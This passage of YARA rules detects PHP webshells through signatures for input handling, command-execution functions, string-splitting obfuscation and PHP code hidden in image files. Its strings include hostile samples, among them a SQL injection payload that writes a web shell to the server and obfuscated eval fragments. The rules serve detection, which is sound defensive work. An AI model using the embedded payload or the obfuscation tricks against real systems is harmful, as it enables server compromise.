	$gfp3 = "$module = new $_GET['module']($_GET['scope']);"
	$gfp4 = "$plugin->$_POST['action']($_POST['id']);"
	$gfp5 = "$_POST[partition_by]($_POST["
	$gfp6 = "$object = new $_REQUEST['type']($_REQUEST['id']);"
	$gfp7 = "The above example code can be easily exploited by passing in a string such as" // ... ;)
	$gfp8 = "Smarty_Internal_Debug::start_render($_template);"
	$gfp9 = "?p4yl04d=UNION%20SELECT%20'<?%20system($_GET['command']);%20?>',2,3%20INTO%20OUTFILE%20'/var/www/w3bsh3ll.php"
	$gfp10 = "[][}{;|]\\|\\\\[+=]\\|<?=>?"
	$gfp11 = "(eval (getenv \"EPROLOG\")))"
	$gfp12 = "ZmlsZV9nZXRfY29udGVudHMoJ2h0dHA6Ly9saWNlbnNlLm9wZW5jYXJ0LWFwaS5jb20vbGljZW5zZS5waHA/b3JkZXJ"
	$gfp_tiny3 = /(echo shell_exec\(\$|assert\('array_key_exists\(|assert\(FALSE\)|assert\(false\)|include "\.\/common\.php")|\(('[\d,a-zA-Z]',){3}/ ascii
	$inp1 = "php://input" wide ascii
	$inp2 = /_GET\s?\[/  ascii
	$inp3 = /\(\s?\$_GET\s?\)/  ascii
	$inp4 = /_POST\s?\[/  ascii
	$inp5 = /\(\s?\$_POST\s?\)/  ascii
	$inp6 = /_REQUEST\s?\[/  ascii
	$inp7 = /\(\s?\$_REQUEST\s?\)/  ascii
	$inp15 = "_SERVER['HTTP_" wide ascii
	$inp16 = "_SERVER[\"HTTP_" wide ascii
	$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/  ascii
	$inp18 = "array_values($_SERVER)" wide ascii
	$inp19 = /file_get_contents\("https?:\/\//  ascii
	$callback1 = /(\bmb_ereg_replace_callback[\t ]*\([^)]|\bsqlite_create_function[\t ]*\([^)]|\bsqlite_create_aggregate[\t ]*\([^)]|\bsession_set_save_handler[\t ]*\([^)]|\bset_exception_handler[\t ]*\([^)]|\bset_error_handler[\t ]*\([^)]|\bregister_tick_function[\t ]*\([^)])/ ascii
	$callback2 = /(\barray_udiff_assoc[\t ]*\([^)]|\barray_reduce[\t ]*\([^)]|\barray_map[\t ]*\([^)]|\barray_intersect_ukey[\t ]*\([^)]|\barray_intersect_uassoc[\t ]*\([^)]|\barray_filter[\t ]*\([^)]|\barray_diff_ukey[\t ]*\([^)]|\barray_diff_uassoc[\t ]*\([^)]|\bob_start[\t ]*\([^)])/ ascii
	$callback3 = /(\bregister_shutdown_function[\t ]*\([^)]|\bcall_user_func_array[\t ]*\([^)]|\bcall_user_func[\t ]*\([^)]|\biterator_apply[\t ]*\([^)]|\bspl_autoload_register[\t ]*\([^)]|\bpreg_replace_callback[\t ]*\([^)]|\busort[\t ]*\([^)]|\buksort[\t ]*\([^)]|\buasort[\t ]*\([^)])/ ascii
	$callback4 = /(forward_static_call_array|\bassert_options[\t ]*\([^)]|\barray_walk[\t ]*\([^)]|\barray_walk_recursive[\t ]*\([^)]|\barray_uintersect[\t ]*\([^)]|\barray_uintersect_uassoc[\t ]*\([^)]|\barray_uintersect_assoc[\t ]*\([^)]|\barray_udiff[\t ]*\([^)]|\barray_udiff_uassoc[\t ]*\([^)])/ ascii
	$m_callback1 = /\bfilter_var[\t ]*\([^)]/ nocase  ascii
	$m_callback2 = "FILTER_CALLBACK" fullword wide ascii
	$cfp1 = /ob_start\(['\"]ob_gzhandler/ nocase  ascii
	$cfp2 = "IWPML_Backend_Action_Loader" ascii wide
	$cfp3 = "<?phpclass WPML" ascii
	$gen_bit_sus1 = /:\s{0,20}eval}/ nocase  ascii
	$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase  ascii
	$gen_bit_sus6 = "self.delete"
	$gen_bit_sus9 = "\"cmd /c" nocase
	$gen_bit_sus10 = "\"cmd\"" nocase
	$gen_bit_sus11 = "\"cmd.exe" nocase
	$gen_bit_sus12 = "%comspec%" wide ascii
	$gen_bit_sus13 = "%COMSPEC%" wide ascii
	$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
	$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
	$gen_bit_sus21 = "\"upload\"" wide ascii
	$gen_bit_sus22 = "\"Upload\"" wide ascii
	$gen_bit_sus23 = "UPLOAD" fullword wide ascii
	$gen_bit_sus24 = "fileupload" wide ascii
	$gen_bit_sus25 = "file_upload" wide ascii
	$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
	$gen_bit_sus30 = "serv-u" wide ascii
	$gen_bit_sus31 = "Serv-u" wide ascii
	$gen_bit_sus32 = "Army" fullword wide ascii
	$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword  ascii
	$gen_bit_sus55 = /\w'\.'\w/  ascii
	$gen_bit_sus56 = /\w\"\.\"\w/  ascii
	$gen_bit_sus73 = /(\.htpasswd|hacking|Hacking|"\?>"\.|\$cmd|\$password="|\$password='|whoami|portscan|Cyber|\/bin\/sh|"execute"|'cmd'|dumper|\.ssh\/authorized_keys| \^ \$|suhosin|bypass|Shell|shell_|<PRE>|<pre>|crack|Content-Transfer-Encoding: Binary)/ ascii
	$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/  ascii
	$gen_much_sus37 = /(rootkit|Rootkit|grayhat|hacker|hacked|HACKED|Hacker|TVqQAAMAAA|Exploit|exploit|'unsafe|"unsafe|nishang|McAfee|antivirus|pcAnywhere|WScript\.Shell\.1|hidded shell|WebShell|Web Shell)/ ascii
	$gen_much_sus38 = /(eval\(eval\(|\("\/\*\/"|\/\*\/\/\*\/|"u"\+"e|q"\+"u"|"\+"\("\+"|a"\+"l"|"e"\+"v|u"\+"n"\+"s|\/\*-\/\*-\*\/)/ ascii
	$gen_much_sus48 = /(-name config\.inc\.php|grep -li password|-perm -02000|-perm -04000|_\.=\$_|\+\+;\$|\+\+; \$|_=\$\$_|-Expire=0|PasswordType=Regular|Shell\.Users|unlink\(__FILE__\))/  ascii
	$gen_much_sus75 = /(password crack|mysqlDll\.dll|net user|suhosin\.executor\.disable_|disabled_suhosin|fopen\("\.htaccess","w|strrev\(['"]|PHPShell|PHP Shell|phpshell|PHPshell|deface|Deface|backdoor|r00t|xp_cmdshell)/ ascii
	$gif = { 47 49 46 38 }
condition:
	not ( any of ( $gfp* ) ) and not ( any of ( $gfp_tiny* ) ) and ( any of ( $inp* ) ) and ( not any of ( $cfp* ) and ( any of ( $callback* )  or all of ( $m_callback* ) ) ) and ( filesize < 1000 or ( $gif at 0 or ( filesize < 4KB and ( 1 of ( $gen_much_sus* ) or 2 of ( $gen_bit_sus* ) ) ) or ( filesize < 20KB and ( 2 of ( $gen_much_sus* ) or 3 of ( $gen_bit_sus* ) ) ) or ( filesize < 500KB and ( 2 of ( $gen_much_sus* ) or 4 of ( $gen_bit_sus* ) ) ) ) )
}
rule Php_Webshell_webshell_php_in_htaccess
{
strings:
	$hta = "AddType application/x-httpd-php .htaccess" wide ascii
condition:
	filesize <100KB and $hta
}
rule Php_Webshell_Torjan_webshell_in_image_picture_php
{
strings:
	$gif = /^GIF8[79]a/
	$jfif = { ff d8 ff e? 00 10 4a 46 49 46 }
	$png = { 89 50 4e 47 0d 0a 1a 0a }
	$php_tag = "<?php"
condition:
	(($gif at 0) or ($jfif at 0) or ($png at 0)) and $php_tag
}
rule Php_Webshell_webshell_php_generic
{
strings:
	$wfp_tiny1 = /escapeshellarg|addslashes/ ascii
	$gfp_tiny0 = /return isset\( \$_POST\[ \$key ] \) \? \$_POST\[ \$key ] : \( isset\( \$_REQUEST\[ \$key ] \) \? \$_REQUEST\[ \$key ] : \$default \);|throw new Exception\('Could not find authentication source with id ' \. \$sourceId\);|echo shell_exec\(\$aspellcommand \. ' 2>&1'\);|assert\('array_key_exists\(|assert\(FALSE\);|assert\(false\);|assert\('FALSE'\);|include \".\/common\.php";/ ascii
	$php_short = "<?" wide ascii
	$no_xml0 = /<\?xml version|<\?xml-stylesheet|<%@LANGUAGE|<\?xpacket|<script language="(vb|jscript|c#)/ ascii
	$php_new1 = /<\?=[^?]|<\?php|<script language="php/ ascii
	$inp0 = /file_get_contents\("https?:\/\/|array_values\(\$_SERVER\)|getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_|_SERVER\["HTTP_|_SERVER\['HTTP_|\(\s?\$_REQUEST\s?\)|_REQUEST\s?\[|\(\s?\$_POST\s?\)|_POST\s?\[|\(\s?\$_GET\s?\)|_GET\s?\[|php:\/\/input/ ascii
	$cpayload1 = /\beval[\t ]*\([^)]/ nocase ascii
	$cpayload2 = /\bexec[\t ]*\([^)]/ nocase ascii
	$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase ascii
	$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase ascii
	$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase ascii
	$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase ascii
	$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase ascii
	$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase ascii
	$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase ascii
	$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase ascii
	$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase ascii
	$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase ascii
	$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase ascii
	$m_cpayload_preg_filter2 = "'|.*|e'" nocase wide ascii
	$cmpayload1 = /\beval[\t ]*\([^)]/ ascii
	$cmpayload2 = /\bexec[\t ]*\([^)]/ nocase ascii
	$cmpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase ascii
	$cmpayload4 = /\bpassthru[\t ]*\([^)]/ nocase ascii
	$cmpayload5 = /\bsystem[\t ]*\([^)]/ nocase ascii
	$cmpayload6 = /\bpopen[\t ]*\([^)]/ nocase ascii
	$cmpayload7 = /\bproc_open[\t ]*\([^)]/ nocase ascii
	$cmpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase ascii
	$cmpayload9 = /\bassert[\t ]*\([^)0]/ nocase ascii
	$cmpayload10 = /\bpreg_replace[\t ]*\([^\)]{1,100}\/e/ nocase ascii
	$cmpayload11 = /\bpreg_filter[\t ]*\([^\)]{1,100}\/e/ nocase ascii
	$cmpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase ascii
	$cmpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase ascii
	$cmpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase ascii
	$gen_bit_sus1 = /:\s{0,20}eval}/ nocase  ascii
	$gen_bit_sus2 = /\.replace\(\/\w\/g/ nocase  ascii
	$gen_bit_sus6 = "self.delete"
	$gen_bit_sus9 = "\"cmd /c" nocase
	$gen_bit_sus10 = "\"cmd\"" nocase
	$gen_bit_sus11 = "\"cmd.exe" nocase
	$gen_bit_sus12 = "%comspec%" wide ascii
	$gen_bit_sus18 = "Hklm.GetValueNames();" nocase
	$gen_bit_sus19 = "http://schemas.microsoft.com/exchange/" wide ascii
	$gen_bit_sus21 = /"upload"|"Upload"|"UPLOAD"/  ascii
	$gen_bit_sus24 = "fileupload" wide ascii
	$gen_bit_sus25 = "file_upload" wide ascii
	$gen_bit_sus29 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789" fullword wide ascii
	$gen_bit_sus30 = "serv-u" wide ascii
	$gen_bit_sus31 = "Serv-u" wide ascii
	$gen_bit_sus32 = "Army" fullword wide ascii
	$gen_bit_sus33 = /\$_(GET|POST|REQUEST)\["\w"\]/ fullword  ascii
	$gen_bit_sus55 = /\w'\.'\w/  ascii
	$gen_bit_sus56 = /\w\"\.\"\w/  ascii
	$gen_bit_sus73 = /(\.htpasswd|hacking|Hacking|"\?>"\.|\$cmd|\$password="|\$password='|whoami|portscan|Cyber|\/bin\/sh|"execute"|'cmd'|dumper|\.ssh\/authorized_keys| \^ \$|suhosin|bypass|Shell|shell_|<PRE>|<pre>|crack|Content-Transfer-Encoding: Binary)/ ascii
	$gen_bit_sus74 = /\btouch\(\$[^,]{1,30},/  ascii
	$gen_much_sus37 = /(rootkit|Rootkit|grayhat|hacker|hacked|HACKED|Hacker|TVqQAAMAAA|Exploit|exploit|'unsafe|"unsafe|nishang|McAfee|antivirus|pcAnywhere|WScript\.Shell\.1|hidded shell|WebShell|Web Shell)/ ascii
	$gen_much_sus38 = /(eval\(eval\(|\("\/\*\/"|\/\*\/\/\*\/|"u"\+"e|q"\+"u"|"\+"\("\+"|a"\+"l"|"e"\+"v|u"\+"n"\+"s|\/\*-\/\*-\*\/)/ ascii
	$gen_much_sus48 = /(-name config\.inc\.php|grep -li password|-perm -02000|-perm -04000|_\.=\$_|\+\+;\$|\+\+; \$|_=\$\$_|-Expire=0|PasswordType=Regular|Shell\.Users|unlink\(__FILE__\))/  ascii
	$gen_much_sus75 = /(password crack|mysqlDll\.dll|net user|suhosin\.executor\.disable_|disabled_suhosin|fopen\("\.htaccess","w|strrev\(['"]|PHPShell|PHP Shell|phpshell|PHPshell|deface|Deface|backdoor|r00t|xp_cmdshell)/ ascii
	$gif = { 47 49 46 38 }
condition:
	not ( any of ( $gfp_tiny* ) ) and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and ( any of ( $inp* ) ) and ( any of ( $cpayload* ) or all of ( $m_cpayload_preg_filter* ) ) and ( ( filesize < 1000 and not any of ( $wfp_tiny* ) ) or ( ( $gif at 0 or ( filesize < 4KB and ( 1 of ( $gen_much_sus* ) or 2 of ( $gen_bit_sus* ) ) ) or ( filesize < 20KB and ( 2 of ( $gen_much_sus* ) or 3 of ( $gen_bit_sus* ) ) ) or ( filesize < 50KB and ( 2 of ( $gen_much_sus* ) or 4 of ( $gen_bit_sus* ) ) ) or ( filesize < 100KB and ( 2 of ( $gen_much_sus* ) or 6 of ( $gen_bit_sus* ) ) ) or ( filesize < 150KB and ( 3 of ( $gen_much_sus* ) or 7 of ( $gen_bit_sus* ) ) ) or ( filesize < 500KB and ( 4 of ( $gen_much_sus* ) or 8 of ( $gen_bit_sus* ) ) ) ) and ( filesize > 5KB or not any of ( $wfp_tiny* ) ) ) or ( filesize < 500KB and ( 4 of ( $cmpayload* ) ) ) )
}
rule Php_Webshell_webshell_php_by_string_obfuscation
{
strings:
	$opbs13 = "{\"_P\"./*-/*-*/\"OS\"./*-/*-*/\"T\"}" wide ascii
	$opbs14 = "/*-/*-*/\"" wide ascii
	$opbs16 = "'ev'.'al'" wide ascii
	$opbs17 = "'e'.'val'" wide ascii
	$opbs18 = "e'.'v'.'a'.'l" wide ascii
	$opbs19 = "bas'.'e6'." wide ascii
	$opbs20 = "ba'.'se6'." wide ascii
	$opbs21 = "as'.'e'.'6'" wide ascii
	$opbs22 = "gz'.'inf'." wide ascii
	$opbs23 = "gz'.'un'.'c" wide ascii
	$opbs24 = "e'.'co'.'d" wide ascii
	$opbs25 = "cr\".\"eat" wide ascii
	$opbs26 = "un\".\"ct" wide ascii
	$opbs27 = "'c'.'h'.'r'" wide ascii
	$opbs28 = "\"ht\".\"tp\".\":/\"" wide ascii
	$opbs29 = "\"ht\".\"tp\".\"s:" wide ascii
	$opbs31 = "'ev'.'al'" nocase wide ascii
	$opbs32 = "eval/*" nocase wide ascii
	$opbs33 = "eval(/*" nocase wide ascii
	$opbs34 = "eval(\"/*" nocase wide ascii
	$opbs36 = "assert/*" nocase wide ascii
	$opbs37 = "assert(/*" nocase wide ascii
	$opbs38 = "assert(\"/*" nocase wide ascii
	$opbs40 = "'ass'.'ert'" nocase wide ascii
	$opbs41 = "${'_'.$_}['_'](${'_'.$_}['__'])" wide ascii
	$opbs44 = "'s'.'s'.'e'.'r'.'t'" nocase wide ascii
	$opbs45 = "'P'.'O'.'S'.'T'" wide ascii
	$opbs46 = "'G'.'E'.'T'" wide ascii
	$opbs47 = "'R'.'E'.'Q'.'U'" wide ascii
	$opbs48 = "se'.(32*2)" nocase
	$opbs49 = "'s'.'t'.'r_'" nocase
	$opbs50 = "'ro'.'t13'" nocase
	$opbs51 = "c'.'od'.'e" nocase
	$opbs53 = "e'. 128/2 .'_' .'d"
	$opbs54 = "<?php                                                                                                                                                                                " //here I end
	$opbs55 = "=chr(99).chr(104).chr(114);$_"
	$opbs56 = "\\x47LOBAL"
	$opbs57 = "pay\".\"load"
	$opbs58 = "bas'.'e64"
	$opbs59 = "dec'.'ode"
	$opbs60 = "fla'.'te"
	$opbs70 = "riny($_CBFG["
	$opbs71 = "riny($_TRG["
	$opbs72 = "riny($_ERDHRFG["
	$opbs73 = "eval(str_rot13("
	$opbs74 = "\"p\".\"r\".\"e\".\"g\""
	$opbs75 = "$_'.'GET"
	$opbs76 = "'ev'.'al("
	$opbs77 = "\\x65\\x76\\x61\\x6c\\x28" wide ascii nocase
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/ ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
condition:
	filesize < 500KB and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and any of ( $opbs* )
}
rule Php_Webshell_webshell_php_writer
{
strings:
	$sus4 = "\"upload\"" wide ascii
	$sus5 = "\"Upload\"" wide ascii
	$sus6 = "gif89" wide ascii
	$sus16 = "Army" fullword wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase  ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/  ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$inp1 = "php://input" wide ascii
	$inp2 = /_GET\s?\[/  ascii
	$inp3 = /\(\s?\$_GET\s?\)/  ascii
	$inp4 = /_POST\s?\[/  ascii
	$inp5 = /\(\s?\$_POST\s?\)/  ascii
	$inp6 = /_REQUEST\s?\[/  ascii
	$inp7 = /\(\s?\$_REQUEST\s?\)/  ascii
	$inp15 = "_SERVER['HTTP_" wide ascii
	$inp16 = "_SERVER[\"HTTP_" wide ascii
	$inp17 = /getenv[\t ]{0,20}\([\t ]{0,20}['"]HTTP_/  ascii
	$inp18 = "array_values($_SERVER)" wide ascii
	$inp19 = /file_get_contents\("https?:\/\//  ascii
	$php_multi_write1 = "fopen(" wide ascii
	$php_multi_write2 = "fwrite(" wide ascii
	$php_write1 = "move_uploaded_file" fullword wide ascii
condition:
	( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and ( any of ( $inp* ) ) and ( any of ( $php_write* ) or all of ( $php_multi_write* ) ) and ( filesize < 400 or ( filesize < 4000 and 1 of ( $sus* ) ) )
}
rule Php_Webshell_webshell_php_encoded_big
{
strings:
	$new_php1 = /<\?=[\w\s@$]/  ascii
	$new_php2 = "<?php" nocase wide ascii
	$new_php3 = "<script language=\"php" nocase wide ascii
	$php_short = "<?"
	$php_semi2 = "==';"
	$cpayload1 = /\beval[\t ]*\([^)]/ nocase  ascii
	$cpayload2 = /\bexec[\t ]*\([^)]/ nocase  ascii
	$cpayload3 = /\bshell_exec[\t ]*\([^)]/ nocase  ascii
	$cpayload4 = /\bpassthru[\t ]*\([^)]/ nocase  ascii
	$cpayload5 = /\bsystem[\t ]*\([^)]/ nocase  ascii
	$cpayload6 = /\bpopen[\t ]*\([^)]/ nocase  ascii
	$cpayload7 = /\bproc_open[\t ]*\([^)]/ nocase  ascii
	$cpayload8 = /\bpcntl_exec[\t ]*\([^)]/ nocase  ascii
	$cpayload9 = /\bassert[\t ]*\([^)0]/ nocase  ascii
	$cpayload10 = /\bpreg_replace[\t ]*\(.{1,100}\/[ismxADSUXju]{0,11}(e|\\x65)/ nocase  ascii
	$cpayload12 = /\bmb_ereg_replace[\t ]*\([^\)]{1,100}'e'/ nocase  ascii
	$cpayload13 = /\bmb_eregi_replace[\t ]*\([^\)]{1,100}'e'/ nocase  ascii
	$cpayload20 = /\bcreate_function[\t ]*\([^)]/ nocase  ascii
	$cpayload21 = /\bReflectionFunction[\t ]*\([^)]/ nocase  ascii
	$cpayload22 = "base64_decode"
	$cpayload23 = "gzinflate"
	$m_cpayload_preg_filter1 = /\bpreg_filter[\t ]*\([^\)]/ nocase  ascii
	$m_cpayload_preg_filter2 = "'|.*|e'" nocase  ascii
condition:
	filesize < 1000KB and ( any of ( $new_php* ) or $php_short at 0 ) and ( any of ( $cpayload* ) or all of ( $m_cpayload_preg_filter* ) ) and ( filesize > 2KB and ( $php_semi2 in (filesize-1000 .. filesize) ) )
}
rule Php_Webshell_webshell_php_dynamic
{
strings:
	$pd_fp1 = "whoops_add_stack_frame" wide ascii
	$pd_fp2 = "new $ec($code, $mode, $options, $userinfo);" wide ascii
	$php_short = "<?" wide ascii
	$no_xml1 = "<?xml version" nocase wide ascii
	$no_xml2 = "<?xml-stylesheet" nocase wide ascii
	$no_asp1 = "<%@LANGUAGE" nocase wide ascii
	$no_asp2 = /<script language="(vb|jscript|c#)/ nocase ascii
	$no_pdf = "<?xpacket"
	$php_new1 = /<\?=[^?]/  ascii
	$php_new2 = "<?php" nocase wide ascii
	$php_new3 = "<script language=\"php" nocase wide ascii
	$dynamic1 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\$/  ascii
	$dynamic2 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\("/  ascii
	$dynamic3 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\('/  ascii
	$dynamic4 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(str/  ascii
	$dynamic5 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(\)/  ascii
	$dynamic6 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(@/  ascii
	$dynamic7 = /\$[a-zA-Z_\x80-\xff][a-zA-Z0-9_\x80-\xff\[\]'"]{0,20}\(base64_decode/  ascii
condition:
	filesize > 20 and filesize < 200 and ( ( ( $php_short in (0..100) or $php_short in (filesize-1000..filesize) ) and not any of ( $no_* ) ) or any of ( $php_new* ) ) and ( any of ( $dynamic* ) ) and not any of ( $pd_fp* )
}
rule Php_Webshell_CN_Honker_Webshell_Tuoku_script_mysql
{
strings:
	$s1 = "txtpassword.Attributes.Add(\"onkeydown\", \"SubmitKeyClick('btnLogin');\");" fullword ascii
	$s2 = "connString = string.Format(\"Host = {0}; UserName = {1}; Password = {2}; Databas" ascii
condition:
	filesize < 202KB and all of them
}
rule Php_Webshell_PHP_Webshell_1_Feb17
{
strings:
	$h1 = "<?php ${\"\\x" ascii
	$x1 = "\";global$auth;function sh_decrypt_phase($data,$key){${\"" ascii
	$x2 = "global$auth;return sh_decrypt_phase(sh_decrypt_phase($" ascii
	$x3 = "]}[\"\x64\"]);}}echo " ascii
	$x4 = "\"=>@phpversion(),\"\\x" ascii
	$s1 = "$i=Array(\"pv\"=>@phpversion(),\"sv\"" ascii
	$s3 = "$data = @unserialize(sh_decrypt(@base64_decode($data),$data_key));" ascii
condition:
	uint32(0) == 0x68703f3c and ( $h1 at 0 and 1 of them ) or 2 of them
}
"##############################################################################;
